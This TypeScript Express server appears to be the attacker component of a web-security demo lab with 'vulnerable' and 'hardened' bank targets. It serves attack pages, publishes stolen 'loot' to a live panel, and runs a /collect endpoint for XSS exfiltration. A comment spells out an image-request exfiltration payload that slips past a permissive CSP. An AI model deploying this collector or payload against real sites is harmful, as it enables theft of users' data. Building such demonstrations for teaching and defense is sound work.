import express from 'express';
import { ATTACKS } from './attacks.js';
import { loadConfig } from './config.js';
import { isTarget, LootHub, parseReport } from './loot.js';
import { landingPage, lootPage, personaUrl } from './pages.js';
import { PERSONA_HOSTS, type PageContext, type Persona } from './types.js';

const { port, targets } = loadConfig();
const loot = new LootHub();
const app = express();

const log = (message: string): void => console.log(`[attacker] ${message}`);

const KNOWN_HOSTS = new Set<string>(Object.values(PERSONA_HOSTS));
const personaFor = (hostname: string): Persona | undefined =>
  (Object.keys(PERSONA_HOSTS) as Persona[]).find((p) => PERSONA_HOSTS[p] === hostname);

app.use((req, _res, next) => {
  log(`${req.method} ${req.hostname}${req.path}  persona=${personaFor(req.hostname) ?? 'unknown'}`);
  next();
});
app.use(express.json({ limit: '16kb' }));

// ---- Pages ---------------------------------------------------------------
app.get('/', (req, res) => {
  res.type('html').send(landingPage(req.hostname, port, targets, !KNOWN_HOSTS.has(req.hostname), ATTACKS));
});

app.get('/loot', (req, res) => {
  res.type('html').send(lootPage(req.hostname));
});

for (const attack of ATTACKS) {
  app.get(attack.path, (req, res) => {
    const target = req.query['target'];
    const ctx: PageContext = {
      host: req.hostname,
      port,
      targets,
      collectOrigin: personaUrl('attacker', port, ''),
      target: isTarget(target) ? target : undefined,
    };
    res.type('html').send(attack.render(ctx));
  });
}

// ---- Loot pipeline -------------------------------------------------------
/** Live feed for the loot panel. */
app.get('/events', (_req, res) => loot.subscribe(res));

/**
 * Exfiltration endpoint for the XSS payload: new Image().src = ".../collect?target=vulnerable&data=..."
 * GET + image request on purpose: it works under the vulnerable bank's "img-src *" CSP.
 */
app.get('/collect', (req, res) => {
  const { target, data } = req.query;
  if (isTarget(target) && typeof data === 'string') {
    loot.publish({ kind: 'xss-exfil', at: new Date().toISOString(), target, data: data.slice(0, 4000) });
    log(`  LOOT from ${target}: ${data.slice(0, 80)}`);
  }
  res.status(204).end();
});

/** Attack pages on any attacker hostname report results here (same-origin fetch, JSON). */
app.post('/report', (req, res) => {
  const event = parseReport(req.body);
  if (!event) {
    res.status(400).json({ error: 'invalid report' });
    return;
  }
  log(`  REPORT ${event.kind} from ${event.target}`);
  loot.publish(event);
  res.status(204).end();
});

app.post('/loot/clear', (_req, res) => {
  loot.clear();
  res.status(204).end();
});

app.listen(port, '0.0.0.0', () => {
  log(`listening on :${port}`);
  log(`targets: vulnerable=${targets.vulnerable} hardened=${targets.hardened}`);
});
